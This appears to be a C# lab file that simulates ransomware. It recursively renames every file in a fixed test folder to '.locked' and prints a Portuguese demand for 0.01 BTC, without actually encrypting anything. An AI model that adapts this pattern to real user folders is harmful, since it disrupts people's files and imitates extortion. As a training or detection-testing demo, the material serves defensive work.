using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Laboratorio.Attacks.App.Attacks
{
    public class FakeRansom
    {
        public static void ExecuteRansom()
        {
            string folder = @"C:\TesteRansom\";

            foreach (string file in Directory.GetFiles(folder))
            {
                File.Move(file, file + ".locked");
            }

            EncryptFilesInFolder(folder);
            Console.WriteLine("Seus arquivos foram bloqueados! Pague 0.01 BTC para recuperar.");
        }


        private static void EncryptFilesInFolder(string pathFolder)
        {
            foreach (string dir in Directory.GetDirectories(pathFolder))
            {
                foreach (string file in Directory.GetFiles(dir))
                    File.Move(file, file + ".locked");

                EncryptFilesInFolder(dir);
            }
        }

    }
}
